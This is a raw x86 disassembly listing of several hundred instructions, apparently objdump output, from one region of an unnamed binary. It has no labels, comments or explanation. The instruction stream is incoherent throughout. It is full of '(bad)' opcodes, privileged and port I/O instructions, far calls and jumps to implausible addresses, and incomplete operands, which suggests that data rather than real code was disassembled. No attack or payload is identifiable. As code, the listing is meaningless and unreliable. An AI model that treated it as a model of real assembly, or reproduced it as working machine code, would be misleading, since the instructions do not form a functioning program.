  418389:	in     eax,dx
  41838a:	jge    0x41838c
  41838c:	ins    BYTE PTR es:[edi],dx
  41838d:	push   0x15
  41838f:	into   
  418390:	jno    0x418362
  418392:	(bad)  
  418393:	iret   
  418394:	cmp    BYTE PTR [edx-0x788259c0],0x3c
  41839b:	sub    al,0x89
  41839d:	mov    bh,0x2b
  41839f:	mov    ds:0xfacff066,eax
  4183a4:	(bad)  
  4183a5:	xor    esi,DWORD PTR [ecx-0x3ed529fc]
  4183ab:	and    al,bl
  4183ad:	sub    DWORD PTR [edi],edx
  4183af:	add    DWORD PTR [ecx+0x19ef77c3],0xafeba987
  4183b9:	leave  
  4183ba:	or     eax,0xda2df53
  4183bf:	ins    DWORD PTR es:[edi],dx
  4183c0:	add    al,0x9f
  4183c2:	popf   
  4183c3:	jne    0x4183bb
  4183c5:	fsub   st(2),st
  4183c7:	pop    ebx
  4183c8:	sub    al,0x51
  4183ca:	push   ecx
  4183cb:	xor    DWORD PTR ds:0xd2f0d3d5,0xffffff99
  4183d2:	jmp    0x41842d
  4183d4:	dec    esi
  4183d5:	or     al,0xaa
  4183d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183d8:	(bad)  
  4183d9:	popa   
  4183da:	dec    eax
  4183db:	iret   
  4183dc:	add    ebx,DWORD PTR ds:0xea727737
  4183e2:	add    ah,BYTE PTR [esi-0x27b0b7ac]
  4183e8:	and    BYTE PTR [edx+0x42e49ac0],dl
  4183ee:	or     DWORD PTR [ebp-0x45],0xfffffff9
  4183f2:	loope  0x4183e1
  4183f4:	fisttp WORD PTR [ebx+ebp*1+0x4b02b772]
  4183fb:	test   al,0x6b
  4183fd:	jg     0x418393
  4183ff:	jl     0x418446
  418401:	jecxz  0x418477
  418403:	add    BYTE PTR [esi*4-0x1531c52f],dh
  41840a:	cdq    
  41840b:	repnz xor ecx,edx
  41840e:	xchg   esi,eax
  41840f:	imul   eax,DWORD PTR ds:0xee5a3e3e,0xffffffb2
  418416:	xlat   BYTE PTR ds:[ebx]
  418417:	pop    esp
  418418:	pop    ebx
  418419:	fdiv   DWORD PTR [ecx]
  41841b:	push   esi
  41841c:	fisttp WORD PTR [ebx-0x1a4142ed]
  418422:	(bad)  
  418423:	jmp    0x4183a8
  418425:	mov    ds:0xa1d50440,al
  41842a:	aas    
  41842b:	add    bh,BYTE PTR [esi]
  41842d:	add    DWORD PTR [ebp+0x24],ecx
  418430:	jno    0x418455
  418432:	adc    DWORD PTR [ecx+esi*4-0x4d3beceb],0x4bb2ad68
  41843d:	fnstsw WORD PTR [esi-0x3]
  418440:	mov    ch,0x59
  418442:	adc    eax,DWORD PTR [eax]
  418444:	pop    ss
  418445:	xlat   BYTE PTR ds:[ebx]
  418446:	adc    cl,BYTE PTR [edx]
  418448:	dec    ebx
  418449:	mov    DWORD PTR cs:[esi+0x14f45c],0xb0f624c5
  418454:	je     0x41847f
  418456:	fsub   QWORD PTR [ecx]
  418458:	sbb    edx,esi
  41845a:	and    al,0x66
  41845c:	mov    esp,edx
  41845e:	out    0x6e,al
  418460:	add    ch,BYTE PTR [ebx-0x1d8c1029]
  418466:	jle    0x41848b
  418468:	mov    edi,ecx
  41846a:	cmp    eax,0x93bf5ce8
  41846f:	cs dec eax
  418471:	adc    cl,BYTE PTR [ebp+ecx*2+0x1453e80]
  418478:	clc    
  418479:	jp     0x418423
  41847b:	dec    edi
  41847c:	pop    ecx
  41847d:	add    ah,BYTE PTR [ecx-0x5ca1e27c]
  418483:	and    BYTE PTR [esi-0x434c3066],ah
  418489:	dec    esi
  41848a:	fs xor eax,0xef222750
  418490:	into   
  418491:	cli    
  418492:	fldcw  WORD PTR [ecx-0x452017aa]
  418498:	inc    esi
  418499:	mov    ds:0x653792ea,eax
  41849e:	daa    
  41849f:	aad    0xd9
  4184a1:	je     0x418459
  4184a3:	into   
  4184a4:	rcl    dh,1
  4184a6:	adc    al,0x1b
  4184a8:	retf   
  4184a9:	es cli 
  4184ab:	and    bl,ah
  4184ad:	jle    0x4184f8
  4184af:	inc    eax
  4184b0:	or     edx,DWORD PTR [edx]
  4184b2:	loop   0x418453
  4184b4:	mov    ebx,?
  4184b6:	mov    bh,0x9e
  4184b8:	mov    cx,WORD PTR [ecx+0x2d463ca0]
  4184bf:	scas   eax,DWORD PTR es:[edi]
  4184c0:	pop    edi
  4184c1:	dec    ecx
  4184c2:	pop    edx
  4184c3:	ins    BYTE PTR es:[edi],dx
  4184c4:	int    0x8d
  4184c6:	adc    eax,DWORD PTR [ecx]
  4184c8:	ret    
  4184c9:	clc    
  4184ca:	pushf  
  4184cb:	stos   BYTE PTR es:[edi],al
  4184cc:	jle    0x418479
  4184ce:	fsubr  DWORD PTR [edi+esi*1-0x2c3e010d]
  4184d5:	jns    0x41852b
  4184d7:	or     eax,0x733f1c0b
  4184dc:	jns    0x418464
  4184de:	sub    esp,DWORD PTR [eax+ecx*2]
  4184e1:	test   ebx,esi
  4184e3:	inc    edx
  4184e4:	fcomi  st,st(6)
  4184e6:	push   0xffffffc2
  4184e8:	inc    esp
  4184e9:	cs cs sahf 
  4184ec:	loop   0x418563
  4184ee:	xchg   esp,eax
  4184ef:	add    ch,dl
  4184f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184f2:	push   cs
  4184f3:	xchg   dx,ax
  4184f5:	or     edx,edx
  4184f7:	cmp    eax,DWORD PTR [ebx+0x47]
  4184fa:	call   0xf72e:0xbd74708f
  418501:	xor    eax,0xc6cd87da
  418506:	jl     0x4184cf
  418508:	xor    eax,0x62f7ebb1
  41850d:	mov    dh,0xc
  41850f:	cwde   
  418510:	fxch   st(4)
  418512:	xor    eax,ebx
  418514:	stc    
  418515:	into   
  418516:	ret    0x3b
  418519:	test   eax,0x94f326f
  41851e:	inc    ecx
  41851f:	pop    ds
  418520:	sbb    BYTE PTR [eax],cl
  418522:	out    0xa5,eax
  418524:	shl    DWORD PTR [eax-0x36a11631],0x6
  41852b:	popf   
  41852c:	inc    ebp
  41852d:	dec    esp
  41852e:	inc    esi
  41852f:	ficom  WORD PTR [ebx-0x6f18ed5c]
  418535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418536:	push   ss
  418537:	div    edi
  418539:	push   edi
  41853a:	cmp    BYTE PTR [esi+ebp*1+0x30],bh
  41853e:	add    BYTE PTR [edx+0x6f],dl
  418541:	fld    st(0)
  418543:	stos   BYTE PTR es:[edi],al
  418544:	sbb    esp,DWORD PTR [ebx-0x7574a86a]
  41854a:	jb     0x4184e9
  41854c:	lock or al,0xe7
  41854f:	loope  0x4185bc
  418551:	pop    edx
  418552:	mov    edx,0x60578b51
  418557:	es push eax
  418559:	inc    esp
  41855a:	inc    esp
  41855b:	mov    cl,0x50
  41855d:	fcom   DWORD PTR [esi+0x786aeaa3]
  418563:	adc    DWORD PTR [ebx-0x36],edi
  418566:	mov    edi,0x6f77912b
  41856b:	add    DWORD PTR [ebp-0x4c],edi
  41856e:	and    DWORD PTR [edi],edx
  418570:	(bad)  
  418571:	jl     0x418516
  418573:	adc    bl,BYTE PTR [edi-0x2f]
  418576:	or     esi,DWORD PTR [edx+0x49]
  418579:	hlt    
  41857a:	and    al,0xd1
  41857c:	inc    ebx
  41857d:	retf   
  41857e:	test   esp,0xa5e80d55
  418584:	add    al,0xc2
  418586:	lahf   
  418587:	es dec esi
  418589:	mov    dl,0x90
  41858b:	arpl   WORD PTR [eax+0xf43c73c],dx
  418591:	xchg   BYTE PTR [ebp+0x334b4833],ah
  418597:	jecxz  0x418573
  418599:	mov    ebp,0xbdd99aaf
  41859e:	adc    al,0x6b
  4185a0:	sub    edx,DWORD PTR ds:[ebx]
  4185a3:	repz int3 
  4185a5:	mov    edx,0x33478f78
  4185aa:	xor    DWORD PTR [ecx],eax
  4185ac:	hlt    
  4185ad:	jo     0x4185a2
  4185af:	int3   
  4185b0:	xchg   esi,eax
  4185b1:	push   ebp
  4185b2:	push   esp
  4185b3:	xchg   esp,eax
  4185b4:	ficom  WORD PTR [eax-0x54]
  4185b7:	xchg   edi,eax
  4185b8:	int    0x31
  4185ba:	std    
  4185bb:	mov    esp,0xccf9553a
  4185c0:	push   edx
  4185c1:	aaa    
  4185c2:	push   cs
  4185c3:	push   0xffffffb4
  4185c5:	hlt    
  4185c6:	adc    DWORD PTR [ebp+0x16ba64b6],edx
  4185cc:	dec    esp
  4185cd:	loop   0x4185eb
  4185cf:	in     al,dx
  4185d0:	popa   
  4185d1:	mov    ebp,esi
  4185d3:	add    ecx,ecx
  4185d5:	cmp    esp,eax
  4185d7:	into   
  4185d8:	retf   
  4185d9:	pop    ss
  4185da:	outs   dx,DWORD PTR ds:[esi]
  4185db:	scas   al,BYTE PTR es:[edi]
  4185dc:	jp     0x418597
  4185de:	mov    esp,DWORD PTR [ecx+0x24]
  4185e1:	stos   BYTE PTR es:[edi],al
  4185e2:	inc    dh
  4185e4:	xor    cl,bh
  4185e6:	inc    esp
  4185e7:	mov    ecx,0xf3cb333b
  4185ec:	pop    edi
  4185ed:	mov    fs,ecx
  4185ef:	aam    0x30
  4185f1:	and    BYTE PTR [ecx+0x68dceb7c],ch
  4185f7:	xchg   DWORD PTR [ecx+0x42],ebx
  4185fa:	xchg   ecx,eax
  4185fb:	out    0x2,eax
  4185fd:	add    esi,0xffffffe9
  418600:	lods   eax,DWORD PTR ds:[esi]
  418601:	add    dh,bl
  418603:	outs   dx,BYTE PTR ds:[esi]
  418604:	pusha  
  418605:	js     0xf05463c
  41860b:	inc    ecx
  41860c:	loop   0x4185c9
  41860e:	push   edi
  41860f:	nop
  418610:	fist   DWORD PTR [eax+0x358381a4]
  418616:	into   
  418617:	adc    ch,BYTE PTR [edi+0x51]
  41861a:	sub    dh,BYTE PTR [ecx]
  41861c:	jno    0x4185fc
  41861e:	or     bh,BYTE PTR [edx]
  418620:	(bad)  
  418621:	pop    ecx
  418622:	std    
  418623:	xor    BYTE PTR [eax+0x1e],al
  418626:	daa    
  418627:	dec    DWORD PTR ds:0x6f77446
  41862d:	mov    al,ds:0x5db9d20e
  418632:	pop    eax
  418633:	scas   al,BYTE PTR es:[edi]
  418634:	xchg   edi,eax
  418635:	mov    bl,0xb1
  418637:	int    0x90
  418639:	les    ebp,FWORD PTR [edx-0x466c5005]
  41863f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418640:	push   ebx
  418641:	imul   edx,DWORD PTR [eax+0x62994ad8],0xf802a9d6
  41864b:	xchg   BYTE PTR [edx+eax*8+0x1f85d346],bl
  418652:	sbb    eax,0xfd38dab0
  418657:	inc    ecx
  418658:	lock repnz daa 
  41865b:	sub    eax,0x99899bef
  418660:	inc    esp
  418661:	inc    esp
  418662:	xor    DWORD PTR [ecx-0x315208d3],ebx
  418668:	xor    al,0xf8
  41866a:	cli    
  41866b:	xlat   BYTE PTR ds:[ebx]
  41866c:	in     eax,0x1
  41866e:	ficomp DWORD PTR [edi]
  418670:	dec    eax
  418671:	repnz and al,0x42
  418674:	xchg   esp,eax
  418675:	jecxz  0x4186cf
  418677:	or     DWORD PTR [edi],0xe9fb6c
  41867d:	mov    bl,0x85
  41867f:	mov    bl,0xae
  418681:	inc    eax
  418682:	stos   DWORD PTR es:[edi],eax
  418683:	add    bl,BYTE PTR [edx]
  418685:	stc    
  418686:	leave  
  418687:	sub    al,0xfc
  418689:	test   eax,0x4f917924
  41868e:	aad    0x4f
  418690:	outs   dx,DWORD PTR ds:[esi]
  418691:	push   es
  418692:	pop    esi
  418693:	ja     0x41863c
  418695:	or     DWORD PTR [eax+0x17],ebx
  418698:	cmpxchg DWORD PTR [eax+0x48],esp
  41869c:	cld    
  41869d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41869e:	push   es
  41869f:	xor    esp,esp
  4186a1:	mov    edx,0x44e98e60
  4186a6:	mov    dh,0x81
  4186a8:	sbb    bl,bl
  4186aa:	int3   
  4186ab:	(bad)  
  4186ac:	push   edx
  4186ad:	gs add esi,edx
  4186b0:	dec    eax
  4186b1:	test   al,0x5e
  4186b3:	repz (bad) 
  4186b5:	sbb    BYTE PTR [edi+0x142ed478],cl
  4186bb:	inc    ebp
  4186bc:	jnp    0x418663
  4186be:	popf   
  4186bf:	and    al,0x8a
  4186c1:	lods   al,BYTE PTR ds:[esi]
  4186c2:	mov    ch,0xc8
  4186c4:	mov    ss,edi
  4186c6:	dec    ecx
  4186c7:	xchg   DWORD PTR [eax-0x21bf591a],ebp
  4186cd:	jp     0x41867b
  4186cf:	adc    ah,BYTE PTR [edi-0x62c3bb11]
  4186d5:	out    dx,eax
  4186d6:	jp     0x418682
  4186d8:	in     al,dx
  4186d9:	into   
  4186da:	clc    
  4186db:	mov    BYTE PTR [ebx-0x15ced72f],cl
  4186e1:	pusha  
  4186e2:	gs mov bh,0x8
  4186e5:	es ins DWORD PTR es:[edi],dx
  4186e7:	dec    edi
  4186e8:	xor    eax,0x934ee76f
  4186ed:	pop    esi
  4186ee:	pop    ds
  4186ef:	inc    esp
  4186f0:	pushf  
  4186f1:	jmp    0x418696
  4186f3:	sbb    eax,0xb552eb79
  4186f8:	(bad)  
  4186f9:	pop    ebp
  4186fa:	push   eax
  4186fb:	jbe    0x4186a0
  4186fd:	push   ecx
  4186fe:	push   ss
  4186ff:	sub    eax,0xdd41fee3
  418704:	jnp    0x41872a
  418706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418707:	scas   eax,DWORD PTR es:[edi]
  418708:	in     al,dx
  418709:	push   edi
  41870a:	fdivr  st(4),st
  41870c:	xchg   esi,eax
  41870d:	xor    ecx,esp
  41870f:	jns    0x41878b
  418711:	cmp    edx,ebx
  418713:	into   
  418714:	ret    
  418715:	arpl   WORD PTR [eax],di
  418717:	mov    eax,0xafd510a6
  41871c:	sub    BYTE PTR [edi+0x7d],ah
  41871f:	pop    eax
  418720:	pop    ebx
  418721:	out    0x6b,al
  418723:	inc    eax
  418724:	aad    0x67
  418726:	cld    
  418727:	je     0x418750
  418729:	dec    ecx
  41872a:	cmc    
  41872b:	shr    DWORD PTR [edx+0x29],cl
  41872e:	add    esi,DWORD PTR [ebx]
  418730:	test   ch,dl
  418732:	mov    al,0x49
  418734:	aaa    
  418735:	int3   
  418736:	jne    0x418788
  418738:	inc    ecx
  418739:	mov    eax,ds:0xbe08a5
  41873e:	jecxz  0x41878f
  418740:	mov    bh,0x87
  418742:	mov    dl,0x24
  418744:	dec    edx
  418745:	fistp  QWORD PTR [edi+0x664ff665]
  41874b:	sbb    eax,0x5afa31e3
  418750:	add    esp,DWORD PTR [ebx]
  418752:	leave  
  418753:	mov    dl,0xbb
  418755:	fisub  WORD PTR [eax+esi*8-0x13fd3f7b]
  41875c:	in     al,dx
  41875d:	dec    esp
  41875e:	fadd   QWORD PTR ds:0xaa05f133
  418764:	xchg   esp,eax
  418765:	mov    al,ds:0xe8ab77fd
  41876a:	cmp    edi,DWORD PTR [eax-0x5c298f87]
  418770:	jne    0x418738
  418772:	imul   edi,ebp,0xd6769e26
  418778:	leave  
  418779:	xchg   ebx,eax
  41877a:	pop    es
  41877b:	mov    edi,0xda86db6e
  418780:	test   eax,0xc2d9f518
  418785:	xchg   esp,eax
  418786:	daa    
  418787:	cmp    eax,0xe260c343
  41878c:	leave  
  41878d:	addr16 sahf 
  41878f:	sbb    BYTE PTR [esi+0x47],bl
  418792:	add    eax,0x241f9228
  418797:	icebp  
  418798:	loop   0x4187e4
  41879a:	pushf  
  41879b:	mov    dh,0x63
  41879d:	add    bh,BYTE PTR [eax+0x4e]
  4187a0:	ins    BYTE PTR es:[edi],dx
  4187a1:	pop    edi
  4187a2:	cmp    ebp,DWORD PTR [ebx+0x57]
  4187a5:	push   edx
  4187a6:	sub    al,0x9a
  4187a8:	mov    ch,0x79
  4187aa:	push   0x1885d720
  4187af:	in     eax,dx
  4187b0:	mov    edx,0x63381098
  4187b5:	or     eax,0xf81aaef5
  4187ba:	or     al,0x99
  4187bc:	mov    ds:0x8c48e150,al
  4187c1:	aad    0xe9
  4187c3:	jmp    0xf153e536
  4187c8:	jl     0x418848
  4187ca:	jo     0x41883c
  4187cc:	in     eax,dx
  4187cd:	jb     0x418832
  4187cf:	mul    DWORD PTR [ecx]
  4187d1:	mov    esi,0xb9653c52
  4187d6:	cmp    ch,BYTE PTR [ebx+0x63]
  4187d9:	adc    edi,edi
  4187db:	mov    dl,BYTE PTR ds:0x34fda55a
  4187e1:	fsub   QWORD PTR [edi+0x35f82121]
  4187e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e8:	retf   0x5b1b
  4187eb:	mov    esi,0xfa544993
  4187f0:	xchg   edx,eax
  4187f1:	retf   
  4187f2:	icebp  
  4187f3:	je     0x4187e0
  4187f5:	inc    ebp
  4187f6:	xchg   ebx,eax
  4187f7:	outs   dx,DWORD PTR ds:[esi]
  4187f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187f9:	lds    esp,FWORD PTR [ebp+0xe16b648]
  4187ff:	sbb    edi,ebx
  418801:	sbb    esp,DWORD PTR [ecx+0x56801977]
  418807:	repz xchg edi,eax
  418809:	jne    0x41882e
  41880b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41880c:	mov    esp,0x9bdcff89
  418811:	fwait
  418812:	mov    ch,0xb1
  418814:	sub    esp,DWORD PTR [ecx+0xe]
  418817:	frstor [eax+0x4]
  41881a:	lods   eax,DWORD PTR ds:[esi]
  41881b:	cdq    
  41881c:	cld    
  41881d:	(bad)
  418821:	loopne 0x4187ed
  418823:	loop   0x418814
  418825:	adc    al,0x40
  418827:	inc    eax
  418828:	jnp    0x4187cf
  41882a:	push   edi
  41882b:	add    BYTE PTR [esi],ah
  41882d:	cli    
  41882e:	and    BYTE PTR [ecx-0x5187725b],ah
  418834:	lds    ebx,FWORD PTR [esi+0x1ab04145]
  41883a:	fs jno 0x418805
  41883d:	push   ecx
  41883e:	idiv   esp
  418840:	pop    es
  418841:	shl    BYTE PTR [eax-0x16c577f9],cl
  418847:	pop    ebx
  418848:	sbb    bl,al
  41884a:	push   edx
  41884b:	and    eax,0x15b2e3ca
  418850:	sub    ebx,DWORD PTR [ecx+eiz*2-0x59]
  418854:	pop    ecx
  418855:	inc    esp
  418856:	push   ebx
  418857:	std    
  418858:	repz inc eax
  41885a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41885b:	inc    esi
  41885c:	xchg   esi,eax
  41885d:	retf   0xb0a6
  418860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418861:	jle    0x4188e2
  418863:	mov    edx,0x56cf558d
  418868:	dec    esi
  418869:	dec    ecx
  41886a:	rol    DWORD PTR [eax],0xc1
  41886d:	shl    BYTE PTR [edi+0x6eb4e53e],0x31
  418874:	bound  edx,QWORD PTR [edi-0xa]
  418877:	jmp    0x64083c69
  41887c:	mov    WORD PTR [ebx],ss
  41887e:	test   ecx,ecx
  418880:	out    dx,al
  418881:	das    
  418882:	call   0xdab6:0xaacdc4a9
  418889:	ds in  al,0x8d
  41888c:	mov    esp,0xae9dc16c
  418891:	add    eax,0xad5be9c2
  418896:	xor    eax,0xc0ff2948
  41889b:	sub    eax,0xb1d9fe93
  4188a0:	push   ds
  4188a1:	adc    edi,DWORD PTR [edi-0x24dc80a6]
  4188a7:	nop
  4188a8:	loope  0x41890a
  4188aa:	sub    eax,DWORD PTR [edi]
  4188ac:	and    DWORD PTR [ebp-0x34],esi
  4188af:	call   0x185d:0x121d7262
  4188b6:	jmp    0x154f:0x927d1448
  4188bd:	loope  0x41893c
  4188bf:	stc    
  4188c0:	test   DWORD PTR [ebp+0x1b],eax
  4188c3:	pop    edx
  4188c4:	add    al,0x3d
  4188c6:	inc    ebp
  4188c7:	data16 fld st(2)
  4188ca:	int    0xa2
  4188cc:	rcl    DWORD PTR [edx-0x55],1
  4188cf:	dec    esp
  4188d0:	jne    0x41887f
  4188d2:	adc    cl,bh
  4188d4:	xchg   esp,eax
  4188d5:	gs dec ebp
  4188d7:	sbb    ah,BYTE PTR [edi-0x24]
  4188da:	xchg   edi,eax
  4188db:	inc    esi
  4188dc:	pop    ebx
  4188dd:	in     al,dx
  4188de:	cli    
  4188df:	jp     0x418883
  4188e1:	mov    edx,0x61f3b87c
  4188e6:	ror    BYTE PTR [ebx+ebp*4+0x358babda],cl
  4188ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188ee:	push   0xffffff88
  4188f0:	adc    DWORD PTR [ebx+ebp*2-0x2ca1d750],edi
  4188f7:	cmp    eax,0xba8915d4
  4188fc:	jns    0x41892a
  4188fe:	inc    ecx
  4188ff:	xor    DWORD PTR [edi-0x5d],edx
  418902:	xchg   ebx,eax
  418903:	sub    al,0x53
  418905:	mov    eax,0xf1c55a04
  41890a:	xchg   ecx,eax
  41890b:	aam    0x5e
  41890d:	and    bl,BYTE PTR [eax+0x3b]
  418910:	mov    al,ds:0xaa642c61
  418915:	mov    eax,ds:0x1456dadb
  41891a:	mov    ds:0xfaf1650b,al
  41891f:	scas   al,BYTE PTR es:[edi]
  418920:	ror    bh,0x3b
  418923:	call   0xe0b8d7c8
  418928:	nop
  418929:	mov    edx,0x252a6307
  41892e:	fiadd  WORD PTR [edx-0x52e93cdf]
  418934:	dec    esp
  418935:	or     ch,BYTE PTR [eax-0x7]
  418938:	jbe    0x4188de
  41893a:	ins    BYTE PTR es:[edi],dx
  41893b:	push   cs
  41893c:	stc    
  41893d:	mov    al,0x81
  41893f:	aas    
  418940:	fild   DWORD PTR [ecx]
  418942:	rcl    DWORD PTR [ecx+0x3a214b73],1
  418948:	pushf  
  418949:	xchg   ebx,eax
  41894a:	int3   
  41894b:	sbb    dh,bh
  41894d:	call   0x362d41c6
  418952:	dec    ebp
  418953:	dec    ecx
  418954:	loopne 0x418914
  418956:	aad    0x77
  418958:	inc    edx
  418959:	jne    0x41896c
  41895b:	jo     0x418965
  41895d:	jns    0x4189da
  41895f:	add    DWORD PTR [ebx+ebx*4+0xedf0888],ecx
  418966:	pop    esp
  418967:	std    
  418968:	sub    edx,ebx
  41896a:	cmp    BYTE PTR [ecx],bh
  41896c:	ret    
  41896d:	sbb    bl,BYTE PTR [ecx]
  41896f:	rol    BYTE PTR ds:0xfdeae449,1
  418975:	fdivrp st(6),st
  418977:	jg     0x418988
  418979:	sub    BYTE PTR [eax],0xae
  41897c:	dec    esi
  41897d:	pop    edi
  41897e:	mov    eax,0xa5fb257
  418983:	push   esi
  418984:	sub    al,0xd7
  418986:	add    eax,DWORD PTR [eax-0x7685f5d2]
  41898c:	sub    bh,bh
  41898e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41898f:	or     al,0x9f
  418991:	push   ebp
  418992:	xor    DWORD PTR [esi+0xc],edx
  418995:	inc    dx
  418997:	pop    eax
  418998:	stos   BYTE PTR es:[edi],al
  418999:	mul    dl
  41899b:	and    cl,BYTE PTR [edx+ebx*4-0x5d]
  41899f:	mov    ebx,0x4ebdadc3
  4189a4:	adc    esi,edi
  4189a6:	xchg   ebp,edx
  4189a8:	mov    si,0x6227
  4189ac:	sub    ecx,DWORD PTR ss:[esi-0x6e]
  4189b0:	adc    ecx,DWORD PTR [edi]
  4189b2:	fxch   st(1)
  4189b4:	jne    0x4189a6
  4189b6:	xchg   esi,eax
  4189b7:	mov    ecx,0x8d353be
  4189bc:	push   ds
  4189bd:	es stos BYTE PTR es:[edi],al
  4189bf:	loopne 0x418964
  4189c1:	dec    eax
  4189c2:	adc    DWORD PTR [ebx-0x42],0x1
  4189c6:	in     eax,dx
  4189c7:	push   ds
  4189c8:	push   cs
  4189c9:	cwde   
  4189ca:	sbb    bl,BYTE PTR [ebp+0x41b10e1a]
  4189d0:	pop    edi
  4189d1:	or     eax,DWORD PTR [ecx-0x45]
  4189d4:	sbb    eax,0x8f804433
  4189d9:	inc    edx
  4189da:	(bad)  
  4189db:	or     DWORD PTR [edx+ebp*4+0x39390902],edi
  4189e2:	cmp    DWORD PTR ds:0xebbf4ce2,ebp
  4189e8:	pop    edx
  4189e9:	mov    ebx,0x8269550c
  4189ee:	dec    eax
  4189ef:	fwait
  4189f0:	test   BYTE PTR [ebx],al
  4189f2:	or     BYTE PTR [ecx+esi*1+0x19],0xd4
  4189f7:	bswap  esp
  4189f9:	mov    BYTE PTR [ebx+0x28],dh
  4189fc:	add    DWORD PTR [esi-0x4c],ebx
  4189ff:	sub    eax,0xc91910b8
  418a04:	and    al,0x78
  418a06:	xchg   BYTE PTR [ecx+0x3a],ah
  418a09:	adc    eax,0xb06b9649
  418a0e:	enter  0x6991,0xa9
  418a12:	mov    ch,dh
  418a14:	jb     0x418a2e
  418a16:	dec    edi
  418a17:	out    dx,al
  418a18:	mov    ds:0xa943a72e,al
  418a1d:	jecxz  0x418a38
  418a1f:	sbb    eax,0x991ea072
  418a24:	in     eax,0x85
  418a26:	shl    edx,cl
  418a28:	int    0xa2
  418a2a:	dec    edi
  418a2b:	call   0xe8b7f850
  418a30:	lahf   
  418a31:	cdq    
  418a32:	int    0xa6
  418a34:	bound  edx,QWORD PTR [edx]
  418a36:	mov    ebx,?
  418a38:	hlt    
  418a39:	stos   DWORD PTR es:[edi],eax
  418a3a:	rcr    ebp,0x45
  418a3d:	cmp    al,0x5
  418a3f:	ds pop es
  418a41:	mov    DWORD PTR [ebx-0x23],ebx
  418a44:	xor    ecx,DWORD PTR [edx+0xbbe0853]
  418a4a:	mov    al,ds:0xb55854de
  418a4f:	mov    esi,0xab7df971
  418a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a55:	xlat   BYTE PTR ds:[ebx]
  418a56:	jae    0x418abc
  418a58:	jmp    0xe65933d8
  418a5d:	push   ds
  418a5e:	add    esi,DWORD PTR [edi]
  418a60:	das    
  418a61:	pushf  
  418a62:	sti    
  418a63:	in     al,0x42
  418a65:	ror    esp,0x7d
  418a68:	inc    ecx
  418a69:	mov    eax,ds:0x1e58d1e5
  418a6e:	sub    BYTE PTR [esi+0x6be601c5],al
  418a74:	nop
  418a75:	stos   DWORD PTR es:[edi],eax
  418a76:	lods   al,BYTE PTR ds:[esi]
  418a77:	or     BYTE PTR [eax],dh
  418a79:	es pushf 
  418a7b:	test   eax,0xc920a1cd
  418a80:	cmp    BYTE PTR [ecx],0xca
  418a83:	sbb    BYTE PTR [edx+ebp*8+0x1e6c16f6],bh
  418a8a:	xor    ch,BYTE PTR [esi]
  418a8c:	mov    al,ds:0x59321322
  418a91:	dec    edx
  418a92:	in     eax,0xf5
  418a94:	ins    BYTE PTR es:[edi],dx
  418a95:	adc    ecx,DWORD PTR [esi]
  418a97:	pop    ds
  418a98:	aaa    
  418a99:	xchg   esp,eax
  418a9a:	test   eax,0xe95b5ec1
  418a9f:	sub    al,0x74
  418aa1:	gs out dx,al
  418aa3:	(bad)  
  418aa4:	clc    
  418aa5:	mov    ch,0xdb
  418aa7:	add    eax,0x1be7aa39
  418aac:	imul   BYTE PTR [esi]
  418aae:	push   ss
  418aaf:	adc    edx,ebx
  418ab1:	outs   dx,BYTE PTR ds:[esi]
  418ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab3:	ins    BYTE PTR es:[edi],dx
  418ab4:	mov    ecx,0xca72f54f
  418ab9:	mov    esi,0xb7fc6f2a
  418abe:	sar    BYTE PTR [eax],1
  418ac0:	adc    esp,DWORD PTR cs:[ebp-0x6bd902e8]
  418ac7:	jae    0x418b1d
  418ac9:	jl     0x418aeb
  418acb:	mov    ebx,0xa853801d
  418ad0:	push   ecx
  418ad1:	nop
  418ad2:	out    0x16,eax
  418ad4:	jnp    0x418adc
  418ad6:	test   BYTE PTR [ecx-0x5e],bh
  418ad9:	and    eax,0xf7929134
  418ade:	mov    ds:0xbe0724cd,eax
  418ae3:	add    ecx,DWORD PTR [eax+0x11f505ef]
  418ae9:	jl     0x418b37
  418aeb:	lahf   
  418aec:	setae  cl
  418aef:	and    al,0xbb
  418af1:	add    ecx,DWORD PTR [ebx+0x23c3dd06]
  418af7:	mov    cl,0x96
  418af9:	jns    0x418a9f
  418afb:	sbb    eax,0x47d9f448
  418b00:	nop
  418b01:	sub    BYTE PTR [ecx-0x43],dl
  418b04:	fisub  DWORD PTR [esi]
  418b07:	(bad)  
  418b08:	ja     0x418b7d
  418b0a:	hlt    
  418b0b:	pop    DWORD PTR [ebp+0x78]
  418b0e:	or     edi,DWORD PTR [ebp-0x2f]
  418b11:	dec    ebp
  418b12:	add    al,0x4b
  418b14:	push   ss
  418b15:	pop    edx
  418b16:	fst    st(5)
  418b18:	adc    BYTE PTR ds:0xc2e63393,dl
  418b1e:	xchg   edi,eax
  418b1f:	outs   dx,BYTE PTR ds:[esi]
  418b20:	sar    cl,1
  418b22:	push   esi
  418b23:	clc    
  418b24:	mov    esi,0xee0215ee
  418b29:	mov    al,ds:0x60f97663
  418b2e:	inc    esp
  418b2f:	mov    ah,0x5b
  418b31:	and    eax,ecx
  418b33:	iret   
  418b34:	mov    edx,0xc84bc750
  418b39:	xchg   DWORD PTR [ebp+0x6765337a],edi
  418b3f:	iret   
  418b40:	pop    edx
  418b41:	pushf  
  418b42:	cs jge 0x418b6a
  418b45:	sub    ecx,esp
  418b47:	rcl    edi,0x6e
  418b4a:	cmp    al,0xbc
  418b4c:	fsubr  QWORD PTR [edx]
  418b4e:	scas   eax,DWORD PTR es:[edi]
  418b4f:	rcl    BYTE PTR [edx+0x31],1
  418b52:	stos   DWORD PTR es:[edi],eax
  418b53:	int    0xe1
  418b55:	retf   
  418b56:	adc    esp,DWORD PTR [ecx-0x3d]
  418b59:	data16 jmp 0x418adf
